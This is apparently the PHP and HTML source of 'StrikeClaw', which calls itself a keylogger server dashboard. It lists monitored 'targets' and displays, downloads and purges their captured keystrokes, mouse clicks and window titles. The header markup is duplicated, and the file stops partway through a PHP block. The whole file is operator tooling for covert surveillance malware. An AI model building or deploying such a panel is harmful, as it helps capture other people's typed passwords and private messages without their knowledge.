<?php
/**
 * StrikeClaw - Advanced Monitoring System
 * Professional keylogger server dashboard with reactive updates
 * Named after the falcon's deadly strike
 */

// Configuration
$baseDir = __DIR__ . '/logs';
$refreshRate = 10; // seconds for reactive updates

// Ensure logs directory exists
if (!file_exists($baseDir)) {
    mkdir($baseDir, 0755, true);
}

// Get list of all clients
function getClients($baseDir) {
    $clients = [];
    if (is_dir($baseDir)) {
        $dirs = scandir($baseDir);
        foreach ($dirs as $dir) {
            if ($dir != '.' && $dir != '..' && is_dir($baseDir . '/' . $dir)) {
                $logPath = $baseDir . '/' . $dir . '/log.txt';
                $lastActivity = file_exists($logPath) ? date('Y-m-d H:i:s', filemtime($logPath)) : 'Never';
                $logSize = file_exists($logPath) ? filesize($logPath) : 0;
                
                // Get first and last timestamp from logs
                $firstSeen = 'Unknown';
                $lastSeen = 'Unknown';
                if (file_exists($logPath) && $logSize > 0) {
                    $lines = file($logPath);
                    if (!empty($lines)) {
                        // Find first timestamp
                        foreach ($lines as $line) {
                            if (preg_match('/\[(KEY|MOUSE)\] (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})/', $line, $matches)) {
                                $firstSeen = $matches[2];
                                break;
                            }
                        }
                        // Find last timestamp
                        for ($i = count($lines) - 1; $i >= 0; $i--) {
                            if (preg_match('/\[(KEY|MOUSE)\] (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})/', $lines[$i], $matches)) {
                                $lastSeen = $matches[2];
                                break;
                            }
                        }
                    }
                }
                
                $clients[] = [
                    'id' => $dir,
                    'last_activity' => $lastActivity,
                    'log_size' => $logSize,
                    'first_seen' => $firstSeen,
                    'last_seen' => $lastSeen,
                    'log_path' => $logPath
                ];
            }
        }
        
        // Sort by last activity (newest first)
        usort($clients, function($a, $b) {
            return strtotime($b['last_activity']) - strtotime($a['last_activity']);
        });
    }
    return $clients;
}

$clients = getClients($baseDir);

// Get selected client for viewing
$selectedClient = isset($_GET['client']) ? $_GET['client'] : null;
$clientLogs = '';
$clientName = '';
$windowStats = [];

if ($selectedClient && in_array($selectedClient, array_column($clients, 'id'))) {
    $logFilePath = $baseDir . '/' . $selectedClient . '/log.txt';
    $clientName = $selectedClient;
    
    if (file_exists($logFilePath)) {
        $clientLogs = file_get_contents($logFilePath);
        
        // Generate window statistics
        $lines = explode("\n", $clientLogs);
        foreach ($lines as $line) {
            if (preg_match('/Window: ([^|]+) \|/', $line, $matches)) {
                $window = trim($matches[1]);
                if (!empty($window) && $window != 'Unknown' && $window != 'Error detecting window') {
                    if (!isset($windowStats[$window])) {
                        $windowStats[$window] = 0;
                    }
                    $windowStats[$window]++;
                }
            }
        }
        arsort($windowStats);
    }
}

// Get current timestamp for last update
$lastUpdate = date('Y-m-d H:i:s');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StrikeClaw - Falcon Eye Monitoring System</title>
    <style>
        /* StrikeClaw - Premium Dark Theme with Falcon Motif */
        :root {
            --primary: #d4a017;        /* Golden falcon eye */
            --primary-dark: #9e7b0e;    /* Darker gold */
            --secondary: #2c1810;       /* Dark brown - falcon plumage */
            --accent: #c41e3a;          /* Deep red - strike mark */
            --bg-dark: #1a1f2e;          /* Night sky */
            --bg-card: #232a3c;          /* Dark blue-gray */
            --bg-hover: #2f3a4f;          /* Lighter blue-gray */
            --text-primary: #ffffff;
            --text-secondary: #b8c7e7;
            --border: #3a4562;
            --success: #00ff9d;
            --warning: #ffb86b;
            --danger: #ff3e3e;
            --info: #6ba6ff;
            --falcon-brown: #8b5a2b;
            --falcon-gold: #ffd700;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-dark);
            color: var(--text-primary);
            min-height: 100vh;
            padding: 20px;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(212, 160, 23, 0.03) 0%, transparent 30%),
                radial-gradient(circle at 90% 80%, rgba(196, 30, 58, 0.03) 0%, transparent 30%),
                url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path d="M50 10 L70 40 L60 40 L75 65 L50 50 L25 65 L40 40 L30 40 L50 10 Z" fill="%23d4a017"/></svg>');
            background-repeat: repeat;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-card);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-dark);
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
        }

        /* Header with Falcon branding */
        .header {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid var(--border);
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), var(--accent), var(--falcon-gold));
            animation: falconGlide 3s ease infinite;
            background-size: 200% 200%;
        }

        @keyframes falconGlide {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 16px;
            position: relative;
        }

        /* Falcon SVG Animation */
        .falcon-logo {
            width: 60px;
            height: 60px;
            position: relative;
            animation: falconHover 3s ease-in-out infinite;
            filter: drop-shadow(0 0 10px var(--primary));
        }

        @keyframes falconHover {
            0%, 100% { transform: translateY(0) rotate(-2deg); }
            50% { transform: translateY(-5px) rotate(2deg); }
        }

        .falcon-eye {
            animation: eyeGlow 2s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes eyeGlow {
            0%, 100% { r: 3; fill: var(--falcon-gold); }
            50% { r: 4; fill: white; }
        }

        .falcon-wing {
            animation: wingBeat 2s ease-in-out infinite;
            transform-origin: 35px 25px;
        }

        @keyframes wingBeat {
            0%, 100% { transform: scaleX(1); }
            50% { transform: scaleX(0.9); }
        }

        .logo-text {
            font-size: 36px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--falcon-gold), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
            text-transform: uppercase;
            position: relative;
        }

        .logo-text::after {
            content: '🦅';
            position: absolute;
            top: -20px;
            right: -30px;
            font-size: 24px;
            transform: rotate(15deg);
            -webkit-text-fill-color: initial;
            color: var(--primary);
        }

        .logo-subtitle {
            color: var(--text-secondary);
            font-size: 14px;
            margin-top: 4px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-subtitle span {
            color: var(--primary);
            font-weight: 600;
        }

        .badge {
            background: rgba(212, 160, 23, 0.15);
            color: var(--primary);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            border: 1px solid rgba(212, 160, 23, 0.3);
            display: inline-block;
            backdrop-filter: blur(5px);
        }

        .badge-accent {
            background: rgba(196, 30, 58, 0.15);
            color: var(--accent);
            border-color: rgba(196, 30, 58, 0.3);
        }

        .last-update {
            position: absolute;
            top: 24px;
            right: 24px;
            background: rgba(0, 0, 0, 0.3);
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 12px;
            color: var(--text-secondary);
            border: 1px solid var(--border);
            backdrop-filter: blur(10px);
        }

        .refresh-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: var(--success);
            border-radius: 50%;
            margin-right: 8px;
            box-shadow: 0 0 10px var(--success);
            animation: falconPulse 2s infinite;
        }

        .refresh-indicator.paused {
            background: var(--danger);
            box-shadow: 0 0 10px var(--danger);
            animation: none;
        }

        @keyframes falconPulse {
            0% {
                opacity: 1;
                transform: scale(1);
                box-shadow: 0 0 10px var(--success);
            }
            50% {
                opacity: 0.5;
                transform: scale(1.2);
                box-shadow: 0 0 20px var(--success);
            }
            100% {
                opacity: 1;
                transform: scale(1);
                box-shadow: 0 0 10px var(--success);
            }
        }

        /* Control Bar */
        .control-bar {
            display: flex;
            gap: 12px;
            align-items: center;
            margin-top: 16px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            border: 1px solid var(--border);
        }

        .btn:hover {
            transform: translateY(-2px);
            border-color: var(--primary);
            box-shadow: 0 5px 15px rgba(212, 160, 23, 0.3);
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
        }

        .btn-primary:hover {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
        }

        .btn-success {
            background: linear-gradient(135deg, var(--success), #00cc7a);
            color: var(--bg-dark);
            border: none;
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--danger), #cc0000);
            border: none;
        }

        .refresh-toggle {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border);
        }

        .refresh-toggle.active {
            background: var(--success);
            color: var(--bg-dark);
            border-color: var(--success);
        }

        .refresh-toggle.paused {
            background: var(--danger);
            color: white;
            border-color: var(--danger);
        }

        select {
            padding: 10px 20px;
            border-radius: 30px;
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            border: 1px solid var(--border);
            cursor: pointer;
            font-size: 14px;
            outline: none;
        }

        select:hover {
            border-color: var(--primary);
        }

        select option {
            background: var(--bg-card);
        }

        /* Statistics Cards */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::after {
            content: '🦅';
            position: absolute;
            bottom: -10px;
            right: -10px;
            font-size: 48px;
            opacity: 0.03;
            transform: rotate(-15deg);
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
            box-shadow: 0 10px 30px rgba(212, 160, 23, 0.2);
        }

        .stat-card h3 {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .stat-card .number {
            color: var(--text-primary);
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary), var(--falcon-gold));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .stat-card.updating {
            animation: statPulse 1s ease;
        }

        @keyframes statPulse {
            0%, 100% { border-color: var(--border); }
            50% { border-color: var(--primary); box-shadow: 0 0 30px rgba(212, 160, 23, 0.3); }
        }

        /* Main Content Layout */
        .main-content {
            display: grid;
            grid-template-columns: 350px 1fr;
            gap: 20px;
        }

        /* Client List */
        .client-list {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--border);
            height: fit-content;
            max-height: 800px;
            overflow-y: auto;
            position: relative;
        }

        .client-list::before {
            content: '🦅';
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 24px;
            opacity: 0.1;
        }

        .client-list h2 {
            color: var(--text-primary);
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 2px solid var(--border);
            position: sticky;
            top: 0;
            background: var(--bg-card);
            z-index: 10;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .search-box {
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border);
            border-radius: 30px;
            color: var(--text-primary);
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .search-box:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(212, 160, 23, 0.3);
        }

        .client-item {
            padding: 16px;
            margin-bottom: 8px;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid var(--border);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .client-item:hover {
            background: var(--bg-hover);
            border-color: var(--primary);
            transform: translateX(5px);
        }

        .client-item.selected {
            background: linear-gradient(135deg, rgba(212, 160, 23, 0.15), transparent);
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(212, 160, 23, 0.2);
        }

        .client-name {
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--text-primary);
            padding-right: 30px;
            font-size: 14px;
        }

        .client-meta {
            font-size: 11px;
            color: var(--text-secondary);
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
        }

        .client-size {
            display: inline-block;
            background: rgba(255, 255, 255, 0.05);
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 10px;
            color: var(--text-secondary);
            border: 1px solid var(--border);
        }

        .client-item.selected .client-size {
            background: rgba(212, 160, 23, 0.15);
            color: var(--primary);
            border-color: var(--primary);
        }

        .online-indicator, .offline-indicator {
            position: absolute;
            top: 16px;
            right: 16px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }

        .online-indicator {
            background: var(--success);
            box-shadow: 0 0 10px var(--success);
        }

        .offline-indicator {
            background: var(--danger);
            box-shadow: 0 0 10px var(--danger);
        }

        /* Log Viewer */
        .log-viewer {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--border);
            position: relative;
        }

        .log-viewer::after {
            content: '🔪';
            position: absolute;
            bottom: 10px;
            right: 10px;
            font-size: 24px;
            opacity: 0.1;
            transform: rotate(15deg);
        }

        .log-viewer h2 {
            color: var(--text-primary);
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 2px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 18px;
        }

        .log-controls {
            display: flex;
            gap: 10px;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid var(--border);
            padding-bottom: 10px;
            flex-wrap: wrap;
        }

        .tab {
            padding: 8px 20px;
            cursor: pointer;
            border-radius: 30px;
            transition: all 0.3s ease;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid var(--border);
        }

        .tab:hover {
            background: var(--bg-hover);
            border-color: var(--primary);
        }

        .tab.active {
            background: var(--primary);
            border-color: var(--primary);
            color: var(--bg-dark);
            font-weight: 600;
        }

        /* Log Content */
        .log-content {
            background: #0a0c0f;
            color: var(--text-primary);
            padding: 20px;
            border-radius: 12px;
            font-family: 'Fira Code', 'Monaco', monospace;
            font-size: 12px;
            line-height: 1.8;
            overflow-x: auto;
            max-height: 600px;
            overflow-y: auto;
            border: 1px solid var(--border);
        }

        .log-content pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            color: var(--text-primary);
            margin: 0;
        }

        .log-entry-key {
            color: var(--success);
        }

        .log-entry-mouse {
            color: var(--info);
        }

        .log-window {
            color: var(--warning);
            font-style: italic;
        }

        /* Window Statistics */
        .window-stats {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid var(--border);
        }

        .window-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid var(--border);
            transition: background 0.3s ease;
        }

        .window-item:hover {
            background: var(--bg-hover);
        }

        .window-name {
            color: var(--text-primary);
            flex: 1;
            word-break: break-all;
            font-size: 13px;
        }

        .window-count {
            background: var(--primary);
            color: var(--bg-dark);
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }

        /* Progress Bar */
        .progress-bar {
            width: 100%;
            height: 4px;
            background: var(--border);
            border-radius: 2px;
            margin-top: 16px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--falcon-gold), var(--accent));
            width: 0%;
            transition: width 0.1s linear;
        }

        .progress-fill.paused {
            background: var(--danger);
        }

        /* Notification */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--bg-card);
            color: var(--text-primary);
            padding: 16px 24px;
            border-radius: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s ease;
            z-index: 1000;
            border: 1px solid var(--border);
            border-left: 4px solid var(--success);
            font-weight: 500;
        }

        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }

        .notification.error {
            border-left-color: var(--danger);
        }

        /* Empty States */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: var(--text-secondary);
        }

        .empty-state div:first-child {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.5;
            animation: floatFalcon 3s ease-in-out infinite;
        }

        @keyframes floatFalcon {
            0%, 100% { transform: translateY(0) rotate(-5deg); }
            50% { transform: translateY(-10px) rotate(5deg); }
        }

        /* Tooltips */
        .tooltip {
            position: relative;
        }

        .tooltip .tooltiptext {
            visibility: hidden;
            width: 140px;
            background-color: var(--bg-card);
            color: var(--text-primary);
            text-align: center;
            border-radius: 8px;
            padding: 8px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -70px;
            opacity: 0;
            transition: opacity 0.3s;
            font-size: 12px;
            border: 1px solid var(--border);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }

        /* Falcon decorative elements */
        .falcon-feather {
            position: absolute;
            width: 20px;
            height: 40px;
            background: linear-gradient(135deg, var(--primary), transparent);
            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
            opacity: 0.1;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .main-content {
                grid-template-columns: 1fr;
            }
            
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            
            .logo-text {
                font-size: 28px;
            }
            
            .last-update {
                position: static;
                margin-top: 16px;
                display: inline-block;
            }
            
            .falcon-logo {
                width: 40px;
                height: 40px;
            }
        }
        
        @media (max-width: 480px) {
            .stats {
                grid-template-columns: 1fr;
            }
            
            .log-controls {
                flex-direction: column;
            }
            
            .logo-text::after {
                display: none;
            }
        }

        /* Glitch Effect for StrikeClaw - Falcon style */
        .glitch {
            position: relative;
            display: inline-block;
        }

        .glitch::before,
        .glitch::after {
            content: 'StrikeClaw';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            overflow: hidden;
            background: transparent;
            color: var(--primary);
            clip: rect(0, 900px, 0, 0);
        }

        .glitch::before {
            left: 2px;
            text-shadow: -2px 0 var(--accent);
            animation: glitch-anim-1 2s infinite linear alternate-reverse;
        }

        .glitch::after {
            left: -2px;
            text-shadow: 2px 0 var(--falcon-gold);
            animation: glitch-anim-2 3s infinite linear alternate-reverse;
        }

        @keyframes glitch-anim-1 {
            0% { clip: rect(36px, 9999px, 9px, 0); }
            20% { clip: rect(85px, 9999px, 58px, 0); }
            40% { clip: rect(34px, 9999px, 67px, 0); }
            60% { clip: rect(61px, 9999px, 15px, 0); }
            80% { clip: rect(94px, 9999px, 34px, 0); }
            100% { clip: rect(57px, 9999px, 94px, 0); }
        }

        @keyframes glitch-anim-2 {
            0% { clip: rect(19px, 9999px, 82px, 0); }
            20% { clip: rect(41px, 9999px, 27px, 0); }
            40% { clip: rect(93px, 9999px, 55px, 0); }
            60% { clip: rect(11px, 9999px, 92px, 0); }
            80% { clip: rect(73px, 9999px, 44px, 0); }
            100% { clip: rect(38px, 9999px, 14px, 0); }
        }

        /* Falcon strike mark */
        .strike-mark {
            display: inline-block;
            width: 20px;
            height: 20px;
            background: var(--accent);
            clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%, 20% 50%);
            transform: rotate(45deg);
            margin-left: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header with Falcon branding -->
        <div class="header">
                          <div class="logo-container">
    <div style="position: relative;">
        <!-- Circular falcon image -->
        <img src="https://raw.githubusercontent.com/Muhammad-Hassnain8/StrikeClaw/refs/heads/master/Falcon.png" alt="StrikeClaw Falcon" 
             style="height: 70px; width: 70px; border-radius: 50%; object-fit: cover; border: 3px solid var(--primary); box-shadow: 0 0 25px var(--primary); transition: all 0.3s ease;"
             onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 0 35px var(--primary)';"
             onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 0 25px var(--primary)';">
        
        <!-- Falcon eye glow effect -->
        <div style="position: absolute; top: 15px; right: 15px; width: 8px; height: 8px; border-radius: 50%; background: white; box-shadow: 0 0 15px white; animation: blink 3s infinite;"></div>
        
        <!-- Claw mark decoration -->
        <div style="position: absolute; bottom: 5px; right: 0; font-size: 16px; transform: rotate(15deg);">🔪</div>
    </div>
    
    <div>
        <h1 class="logo-text glitch">StrikeClaw</h1>
        <div class="logo-subtitle">
            <span>🦅 FALCON EYE</span> · Advanced Monitoring System v2.0
            <span class="strike-mark"></span>
        </div>
    </div>
    <span class="badge" style="margin-left: auto;">
        <span class="falcon-eye" style="display: inline-block; margin-right: 5px;">👁️</span> 
        LIVE STRIKE
    </span>
</div>

<!-- Add this CSS for the blink animation -->
<style>
@keyframes blink {
    0%, 100% { opacity: 1; transform: scale(1); }
    95% { opacity: 1; transform: scale(1); }
    96% { opacity: 0.3; transform: scale(0.8); }
    97% { opacity: 1; transform: scale(1.2); }
    98% { opacity: 1; transform: scale(1); }
}
</style>
                    <h1 class="logo-text glitch">StrikeClaw</h1>
                    <div class="logo-subtitle">
                        <span>🦅 FALCON EYE</span> · Advanced Monitoring System v2.0
                        <span class="strike-mark"></span>
                    </div>
                </div>
                <span class="badge" style="margin-left: auto;">
                    <span class="falcon-eye" style="display: inline-block; margin-right: 5px;">👁️</span> 
                    LIVE STRIKE
                </span>
            </div>
            
            <div class="last-update">
                <span class="refresh-indicator" id="refreshIndicator"></span>
                <span id="lastUpdate"><?php echo $lastUpdate; ?></span>
            </div>
            
            <div class="control-bar">
                <button class="btn tooltip" onclick="manualRefresh()">
                    🦅 Sync Now
                    <span class="tooltiptext">Force data synchronization</span>
                </button>
                <button class="btn refresh-toggle tooltip active" id="refreshToggle" onclick="toggleAutoRefresh()">
                    ⏸️ Pause Falcon Eye
                    <span class="tooltiptext">Toggle automatic surveillance</span>
                </button>
                <select id="refreshInterval" onchange="changeRefreshInterval(this.value)">
                    <option value="5">5 seconds</option>
                    <option value="10" selected>10 seconds</option>
                    <option value="30">30 seconds</option>
                    <option value="60">1 minute</option>
                    <option value="300">5 minutes</option>
                </select>
                <span style="color: var(--text-secondary); font-size: 12px;">
                    ⏱️ <span id="nextRefresh">10</span>s until next strike
                </span>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
        
        <!-- Statistics -->
        <div class="stats" id="statsContainer">
            <div class="stat-card" id="statTotalClients">
                <h3>🎯 Targets in Sight</h3>
                <div class="number" id="totalClients"><?php echo count($clients); ?></div>
            </div>
            <div class="stat-card" id="statTotalSize">
                <h3>💾 Intelligence Gathered</h3>
                <div class="number" id="totalSize"><?php
                    $totalSize = 0;
                    foreach ($clients as $client) {
                        $totalSize += $client['log_size'];
                    }
                    echo $totalSize > 1048576 ? round($totalSize / 1048576, 2) . ' MB' : 
                         ($totalSize > 1024 ? round($totalSize / 1024, 2) . ' KB' : $totalSize . ' bytes');
                ?></div>
            </div>
            <div class="stat-card" id="statActiveToday">
                <h3>⚡ Active Predators</h3>
                <div class="number" id="activeToday"><?php
                    $today = date('Y-m-d');
                    $activeToday = 0;
                    foreach ($clients as $client) {
                        if (substr($client['last_activity'], 0, 10) == $today) {
                            $activeToday++;
                        }
                    }
                    echo $activeToday;
                ?></div>
            </div>
            <div class="stat-card" id="statTotalEvents">
                <h3>📊 Total Strikes</h3>
                <div class="number" id="totalEvents"><?php
                    $totalEvents = 0;
                    foreach ($clients as $client) {
                        if (file_exists($client['log_path'])) {
                            $lines = file($client['log_path']);
                            $totalEvents += count($lines);
                        }
                    }
                    echo number_format($totalEvents);
                ?></div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="main-content">
            <!-- Client List -->
            <div class="client-list">
                <h2>
                    <span>🎯 TARGETS</span>
                    <span class="badge badge-accent"><?php echo count($clients); ?> in scope</span>
                </h2>
                <input type="text" class="search-box" placeholder="🔍 Scan targets..." id="clientSearch" onkeyup="filterClients()">
                
                <div id="clientList">
                    <?php if (empty($clients)): ?>
                        <div class="empty-state" id="noClients">
                            <div>🦅</div>
                            No targets in sight<br>
                            <small style="color: var(--text-secondary);">Waiting for falcon to strike...</small>
                        </div>
                    <?php else: ?>
                        <?php foreach ($clients as $client): 
                            $timeDiff = time() - strtotime($client['last_activity']);
                            $isOnline = $timeDiff < 300;
                        ?>
                            <div class="client-item <?php echo $selectedClient == $client['id'] ? 'selected' : ''; ?>" 
                                 onclick="selectClient('<?php echo urlencode($client['id']); ?>')"
                                 data-client-id="<?php echo htmlspecialchars($client['id']); ?>"
                                 id="client-<?php echo htmlspecialchars(preg_replace('/[^a-zA-Z0-9]/', '_', $client['id'])); ?>">
                                <div class="client-name">🎯 <?php echo htmlspecialchars(substr($client['id'], 0, 30)) . (strlen($client['id']) > 30 ? '...' : ''); ?></div>
                                <div class="client-meta">
                                    <span class="client-time">First sight: <?php echo substr($client['first_seen'], 0, 16); ?></span>
                                    <span class="client-time">Last strike: <?php echo substr($client['last_seen'], 0, 16); ?></span>
                                </div>
                                <span class="client-size"><?php 
                                    if ($client['log_size'] > 1024) {
                                        echo round($client['log_size'] / 1024, 2) . ' KB';
                                    } else {
                                        echo $client['log_size'] . ' B';
                                    }
                                ?></span>
                                <span class="<?php echo $isOnline ? 'online-indicator' : 'offline-indicator'; ?>" 
                                      title="<?php echo $isOnline ? 'In sight' : 'Out of range'; ?>"></span>
                            </div>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
            </div>
            
            <!-- Log Viewer -->
            <div class="log-viewer">
                <h2>
                    <span>📝 STRIKE INTELLIGENCE: <span id="selectedClientName"><?php echo $clientName ? htmlspecialchars(substr($clientName, 0, 50)) . (strlen($clientName) > 50 ? '...' : '') : 'Select target'; ?></span></span>
                    <div class="log-controls">
                        <a href="download_logs.php?client=<?php echo urlencode($selectedClient); ?>" class="btn btn-success tooltip" id="downloadBtn" <?php echo !$selectedClient ? 'style="display:none;"' : ''; ?>>
                            ⬇️ Extract
                            <span class="tooltiptext">Download intelligence</span>
                        </a>
                        <button class="btn btn-danger tooltip" onclick="clearLogs('<?php echo $selectedClient; ?>')" id="clearBtn" <?php echo !$selectedClient ? 'style="display:none;"' : ''; ?>>
                            🗑️ Purge
                            <span class="tooltiptext">Delete all intelligence</span>
                        </button>
                        <button class="btn tooltip" onclick="copyToClipboard()" id="copyBtn" <?php echo !$selectedClient ? 'style="display:none;"' : ''; ?>>
                            📋 Copy
                            <span class="tooltiptext">Copy to clipboard</span>
                        </button>
                    </div>
                </h2>
                
                <div id="logViewerContent">
                    <?php if ($selectedClient && empty($clientLogs)): ?>
                        <div class="empty-state">
                            <div>📄</div>
                            No intelligence available<br>
                            <small style="color: var(--text-secondary);">Waiting for falcon to strike...</small>
                        </div>
                    <?php elseif ($selectedClient): ?>
                        <!-- Tabs -->
                        <div class="tabs">
                            <div class="tab active" onclick="showTab('logs')">📝 Raw Data</div>
                            <div class="tab" onclick="showTab('windows')">🪟 Applications (<?php echo count($windowStats); ?>)</div>
                            <div class="tab" onclick="showTab('stats')">📊 Analytics</div>
                            <div class="tab" onclick="showTab('timeline')">⏰ Timeline</div>
                        </div>
                        
                        <!-- Logs Tab -->
                        <div id="tab-logs" class="tab-content active">
                            <div class="log-content" id="logContent">
                                <pre id="logData"><?php
                                    $coloredLogs = htmlspecialchars($clientLogs);
                                    $coloredLogs = preg_replace('/\[KEY\] (.*?) \| Window: (.*?) \| Key: (.*?)\n/', 
                                        '<span class="log-entry-key">⌨️ $1</span> <span class="log-window">📱 $2</span> 🔑 $3' . "\n", 
                                        $coloredLogs);
                                    $coloredLogs = preg_replace('/\[MOUSE\] (.*?) \| Window: (.*?) \| Click at (.*?)\n/', 
                                        '<span class="log-entry-mouse">🖱️ $1</span> <span class="log-window">📱 $2</span> 📍 $3' . "\n", 
                                        $coloredLogs);
                                    echo $coloredLogs;
                                ?></pre>
                            </div>
                        </div>
                        
                        <!-- Windows Tab -->
                        <div id="tab-windows" class="tab-content">
                            <div class="window-stats" id="windowStats">
                                <h3>
                                    🎯 Application Usage
                                    <span style="font-size: 12px; color: var(--text-secondary);">Total: <?php echo array_sum($windowStats); ?> events</span>
                                </h3>
                                <?php if (empty($windowStats)): ?>
                                    <div class="empty-state">No application data available</div>
                                <?php else: ?>
                                    <?php foreach ($windowStats as $window => $count): 
                                        $percentage = round(($count / array_sum($windowStats)) * 100, 1);
                                    ?>
                                        <div class="window-item">
                                            <span class="window-name"><?php echo htmlspecialchars($window); ?></span>
                                            <span class="window-count"><?php echo $count; ?> (<?php echo $percentage; ?>%)</span>
                                        </div>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <!-- Statistics Tab -->
                        <div id="tab-stats" class="tab-content">
                            <div class="window-stats" id="statisticsTab">
                                <h3>📊 Strike Analysis</h3>
                                <?php
                                $keyCount = substr_count($clientLogs, '[KEY]');
                                $mouseCount = substr_count($clientLogs, '[MOUSE]');
                                $totalEvents = $keyCount + $mouseCount;
